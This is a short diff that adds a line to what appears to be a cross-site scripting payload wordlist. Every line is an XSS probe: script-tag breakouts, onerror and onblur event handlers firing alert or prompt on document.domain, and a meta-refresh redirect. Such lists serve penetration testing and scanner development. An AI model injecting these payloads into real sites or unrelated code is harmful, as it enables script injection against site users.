@@ -1,4 +1,5 @@
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)>
+<bla tabindex=1 onblur=alert(1) autofocus></bla><meta http-equiv="refresh" content=1;URL=mailto:someone@example.com">
 %27";}</script><script>prompt(document.domain);</script>
 ‘>alert(154)</script><script/154=’;;;;;;;
 '>alert(154)</script><script/154=';;;;;;;
